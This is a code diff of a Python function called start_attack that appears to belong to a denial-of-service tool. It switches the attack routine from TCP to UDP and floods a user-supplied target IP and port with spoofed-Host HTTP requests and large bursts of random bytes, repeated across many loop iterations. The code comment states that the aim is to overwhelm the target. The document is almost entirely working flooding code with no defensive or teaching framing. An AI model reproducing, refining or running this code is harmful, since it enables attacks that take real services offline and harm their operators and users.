@@ -37,21 +37,18 @@ def start_attack():
     #target_port = data.get('port', 80)
 
     def attack():
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target_ip, int(target_port)))
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-        host_header = f"Host: {fake_ip}\r\n"
-        payload = f"GET / HTTP/1.1\r\n{host_header}\r\n"
-        s.send(payload.encode())
-    
+        payload = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n"
+        s.sendto(payload.encode(), (target_ip, int(target_port)))
     # Send a large number of random bytes multiple times to overwhelm the target
         for _ in range(int(num_bytes) // 1024):  # Send in chunks of 1KB
-            s.send(os.urandom(1024))
+            s.sendto(os.urandom(num_bytes), (target_ip, int(target_port)))
         remaining_bytes = int(num_bytes) % 1024
         if remaining_bytes > 0:
-            s.send(os.urandom(remaining_bytes))
-        s.close()  # Close the    
-
+            s.sendto(os.urandom(remaining_bytes), (target_ip, int(target_port)))
+        s.close()
+        
     for _ in range(int(data.get('threads', 10))):
         for _ in range(int(num_attacks)):
             attack()
